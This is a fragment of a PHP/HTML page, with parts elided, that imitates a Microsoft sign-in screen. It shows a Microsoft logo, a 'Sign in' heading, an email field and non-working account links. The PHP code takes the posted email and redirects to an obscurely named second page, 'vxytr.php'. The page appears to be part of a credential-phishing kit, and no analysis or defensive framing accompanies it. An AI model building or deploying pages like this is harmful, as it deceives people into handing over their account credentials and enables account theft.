...
<body>
	...
	if (isset($_POST['user']) && !empty($_POST['user'])) {
		...
		<script type="text/javascript">
			window.setTimeout(function(){location.href = "./vxytr.php"},0)
		</script>
	...
	?>
		<form id="multiphase" onsubmit="return validateForm()" width="500" method="POST">
			<img src="microsoft_logo.svg" width="120">
			<br><br>
			<font size="5" >Sign in</font>
			<p id="demo"></p>
			<input type="email" name="user" placeholder="Email address" id="userx">
			<br><br>

			<font size="2">No account?</font> <a href="#" style="color: #006EBCFF;">create one</a>
			<br><br>
			<a href="#" style="color: #006EBCFF;">Sign-in options</a>
			<br><br><br>
